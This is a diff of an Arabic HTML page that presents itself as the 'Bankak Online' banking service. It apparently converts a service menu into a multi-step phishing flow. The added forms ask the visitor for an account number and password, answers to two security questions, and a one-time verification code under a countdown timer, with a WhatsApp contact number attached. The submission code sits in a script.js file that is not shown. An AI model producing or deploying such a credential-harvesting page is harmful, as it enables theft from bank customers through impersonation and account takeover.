@@ -18,7 +18,7 @@
             text-align: center;
         }
 
-        /* الهيدر العلوي */
+        /* الهيدر أو القسم العلوي باللون الأحمر */
         .header-section {
             background-color: #e31b23;
             color: #ffffff;
@@ -26,6 +26,7 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
 
+        /* تنسيق الشعار واللوجو */
         .bank-logo-container {
             display: flex;
             align-items: center;
@@ -77,6 +78,7 @@
             color: #ffde17;
         }
 
+        /* زر خدمات بنكك أونلاين الأصفر */
         .services-badge {
             display: inline-block;
             background-color: #ffc107;
@@ -89,10 +91,22 @@
             margin-top: 10px;
         }
 
-        /* المحتوى الرئيسي */
+        /* القسم السفلي الأبيض */
         .content-section {
             background-color: #ffffff;
             padding: 30px 20px;
+            min-height: 400px;
+        }
+
+        /* نظام إخفاء وإظهار الخطوات */
+        .step-card {
+            display: none;
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: right;
+        }
+        .step-card.active {
+            display: block;
         }
 
         .welcome-title {
@@ -100,6 +114,7 @@
             font-size: 22px;
             font-weight: bold;
             margin-bottom: 3px;
+            text-align: center;
         }
 
         .welcome-subtitle {
@@ -107,6 +122,7 @@
             font-size: 18px;
             font-weight: bold;
             margin-bottom: 15px;
+            text-align: center;
         }
 
         .instruction-text {
@@ -114,12 +130,11 @@
             font-size: 15px;
             font-weight: 500;
             margin-bottom: 25px;
+            text-align: center;
         }
 
         /* حاوية الخدمات */
         .services-container {
-            max-width: 600px;
-            margin: 0 auto;
             display: flex;
             flex-direction: column;
             gap: 15px;
@@ -136,8 +151,8 @@
             justify-content: space-between;
             box-shadow: 0 2px 8px rgba(0,0,0,0.04);
             text-decoration: none;
-            transition: all 0.2s ease;
             cursor: pointer;
+            transition: all 0.2s ease;
         }
 
         .service-card:hover {
@@ -174,7 +189,74 @@
             flex-shrink: 0;
         }
 
-        /* أيقونة الواتساب المثبتة */
+        /* نماذج الإدخال وأسئلة الأمان */
+        .form-title {
+            color: #e31b23;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 6px;
+            color: #444;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 15px;
+            outline: none;
+            background-color: #fafafa;
+        }
+
+        .form-group input:focus {
+            border-color: #e31b23;
+            background-color: #fff;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: #e31b23;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 4px 10px rgba(227, 27, 35, 0.2);
+        }
+
+        .btn-submit:hover {
+            background-color: #c41219;
+        }
+
+        /* صندوق العد التنازلي للـ OTP */
+        .timer-box {
+            text-align: center;
+            background-color: #fff3f3;
+            border: 1px solid #ffcdd2;
+            color: #d32f2f;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        /* أيقونة الواتساب المصغرة المثبتة */
         .whatsapp-float {
             position: fixed;
             bottom: 15px;
@@ -198,7 +280,7 @@
 </head>
 <body>
 
-    <!-- الهيدر -->
+    <!-- الجزء العلوي الأحمر والشعار -->
     <div class="header-section">
         <div class="bank-logo-container">
             <div class="logo-icon"></div>
@@ -214,61 +296,112 @@
         </div>
     </div>
 
-    <!-- قائمة الخدمات -->
+    <!-- القسم السفلي الذي يتغير حسب الخطوة -->
     <div class="content-section">
-        <h1 class="welcome-title">مرحباً بكم في خدمات بنكك أونلاين Bankak</h1>
-        <h2 class="welcome-subtitle">Online</h2>
-        <p class="instruction-text">الرجاء الاختيار من الخدمات المقدمة أدناه</p>
 
-        <div class="services-container">
-            <a href="#" class="service-card">
-                <div class="service-info">
-                    <div class="service-title">تحديث البيانات</div>
-                    <div class="service-desc">تحديث بيانات حسابك الشخصية.</div>
-                </div>
-                <div class="service-icon-box">🔄</div>
-            </a>
+        <!-- الخطوة الرئيسية: عرض الخدمات -->
+        <div id="step-services" class="step-card active">
+            <h1 class="welcome-title">مرحباً بكم في خدمات بنكك أونلاين Bankak</h1>
+            <h2 class="welcome-subtitle">Online</h2>
+            <p class="instruction-text">الرجاء الاختيار من الخدمات المقدمة أدناه</p>
 
-            <a href="#" class="service-card">
-                <div class="service-info">
-                    <div class="service-title">رفع سقف التحويلات اليومية</div>
-                    <div class="service-desc">زيادة الحد اليومي للتحويلات.</div>
+            <div class="services-container">
+                <div class="service-card" onclick="selectService('تحديث البيانات')">
+                    <div class="service-info">
+                        <div class="service-title">تحديث البيانات</div>
+                        <div class="service-desc">تحديث بيانات حسابك الشخصية.</div>
+                    </div>
+                    <div class="service-icon-box">🔄</div>
                 </div>
-                <div class="service-icon-box">⏱</div>
-            </a>
 
-            <a href="#" class="service-card">
-                <div class="service-info">
-                    <div class="service-title">التحويلات الخاطئة</div>
-                    <div class="service-desc">معالجة أخطاء التحويلات البنكية.</div>
+                <div class="service-card" onclick="selectService('رفع سقف التحويلات اليومية')">
+                    <div class="service-info">
+                        <div class="service-title">رفع سقف التحويلات اليومية</div>
+                        <div class="service-desc">زيادة الحد اليومي للتحويلات.</div>
+                    </div>
+                    <div class="service-icon-box">⏱</div>
                 </div>
-                <div class="service-icon-box">⇄</div>
-            </a>
 
-            <a href="#" class="service-card">
-                <div class="service-info">
-                    <div class="service-title">خدمات العملات الأجنبية</div>
-                    <div class="service-desc">تفعيل وإدارة العملات الأجنبية.</div>
+                <div class="service-card" onclick="selectService('التحويلات الخاطئة')">
+                    <div class="service-info">
+                        <div class="service-title">التحويلات الخاطئة</div>
+                        <div class="service-desc">معالجة أخطاء التحويلات البنكية.</div>
+                    </div>
+                    <div class="service-icon-box">⇄</div>
                 </div>
-                <div class="service-icon-box">🌐</div>
-            </a>
 
-            <a href="#" class="service-card">
-                <div class="service-info">
-                    <div class="service-title">كشف الحساب</div>
-                    <div class="service-desc">الحصول على كشف حساب مفصل.</div>
+                <div class="service-card" onclick="selectService('خدمات العملات الأجنبية')">
+                    <div class="service-info">
+                        <div class="service-title">خدمات العملات الأجنبية</div>
+                        <div class="service-desc">تفعيل وإدارة العملات الأجنبية.</div>
+                    </div>
+                    <div class="service-icon-box">🌐</div>
                 </div>
-                <div class="service-icon-box">📄</div>
-            </a>
+
+                <div class="service-card" onclick="selectService('كشف الحساب')">
+                    <div class="service-info">
+                        <div class="service-title">كشف الحساب</div>
+                        <div class="service-desc">الحصول على كشف حساب مفصل.</div>
+                    </div>
+                    <div class="service-icon-box">📄</div>
+                </div>
+            </div>
         </div>
+
+        <!-- الخطوة الأولى: إدخال رقم الحساب وكلمة المرور -->
+        <div id="step-login" class="step-card">
+            <h2 class="form-title" id="selected-service-title">الخدمة</h2>
+            <div class="form-group">
+                <label>رقم الحساب البنكي / المعرف:</label>
+                <input type="text" id="accountNumber" required placeholder="أدخل رقم الحساب">
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور:</label>
+                <input type="password" id="password" required placeholder="أدخل كلمة المرور">
+            </div>
+            <button type="button" class="btn-submit" onclick="goToSecurityQuestions()">التالي (أسئلة الأمان)</button>
+        </div>
+
+        <!-- الخطوة الثانية: أسئلة الأمان -->
+        <div id="step-security" class="step-card">
+            <h2 class="form-title">أسئلة الأمان</h2>
+            <div class="form-group">
+                <label>سؤال الأمان 1: ما هو اسم أول مدرسة درست فيها؟</label>
+                <input type="text" id="secQ1" required placeholder="أدخل الإجابة">
+            </div>
+            <div class="form-group">
+                <label>سؤال الأمان 2: ما هو اسم مدينتك المفضلة؟</label>
+                <input type="text" id="secQ2" required placeholder="أدخل الإجابة">
+            </div>
+            <button type="button" class="btn-submit" onclick="goToOTP()">تأكيد وإرسال رمز التحقق</button>
+        </div>
+
+        <!-- الخطوة الثالثة: رمز الـ OTP والعد التنازلي لمدة ساعة -->
+        <div id="step-otp" class="step-card">
+            <h2 class="form-title">تأكيد رمز التحقق (OTP)</h2>
+            <p style="font-size: 13px; color: #666; margin-bottom: 15px; text-align: center;">
+                تم إرسال رمز التحقق إلى رقم الشريحة أو البريد الإلكتروني المسجل.
+            </p>
+
+            <div class="timer-box">
+                الوقت المتبقي لانتهاء صلاحية الرمز: <span id="countdown">60:00</span>
+            </div>
+
+            <div class="form-group">
+                <label>أدخل رمز التحقق (OTP):</label>
+                <input type="text" id="otpInput" required placeholder="أدخل الرمز المكون من أرقام" maxlength="6">
+            </div>
+            <button type="button" class="btn-submit" onclick="completeProcess()">إتمام الطلب</button>
+        </div>
+
     </div>
 
-    <!-- زر الواتساب -->
+    <!-- زر الواتساب المصغر -->
     <a href="https://wa.me/249998924425" target="_blank" class="whatsapp-float">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
     </a>
 
-    <!-- ربط ملف الـ JS الخارجي -->
+    <!-- ربط ملف الـ JavaScript -->
     <script src="script.js"></script>
 </body>
 </html>
